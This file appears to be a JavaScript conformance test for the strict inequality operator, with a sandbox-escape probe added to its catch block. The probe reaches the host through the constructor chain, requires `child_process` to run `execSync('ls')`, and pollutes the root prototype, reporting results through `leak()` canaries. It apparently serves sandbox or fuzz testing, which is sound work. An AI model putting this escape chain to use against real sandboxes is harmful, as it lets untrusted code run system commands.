try {
    if (!(true !== new Boolean(true))) {
        $ERROR('#1: true !== new Number(true)');
    }
    if (!(true !== 1)) {
        $ERROR('#2: true !== 1');
    }
    if (!(true !== new Number(true))) {
        $ERROR('#3: true !== new Number(true)');
    }
    if (!(true !== '1')) {
        $ERROR('#4: true !== "1"');
    }
    if (!(true !== new String(true))) {
        $ERROR('#5: true !== new String(true)');
    }
    if (!(new Boolean(false) !== false)) {
        $ERROR('#6: new Number(false) !== false');
    }
    if (!(0 !== false)) {
        $ERROR('#7: 0 !== false');
    }
    if (!(new Number(false) !== false)) {
        $ERROR('#8: new Number(false) !== false');
    }
    if (!('0' !== false)) {
        $ERROR('#9: "0" !== false');
    }
    if (!(false !== new String(false))) {
        $ERROR('#10: false !== new String(false)');
    }
    if (!(true !== {
            valueOf: function () {
                return true;
            }
        })) {
        $ERROR('#11: true !== {valueOf: function () {return true}}');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}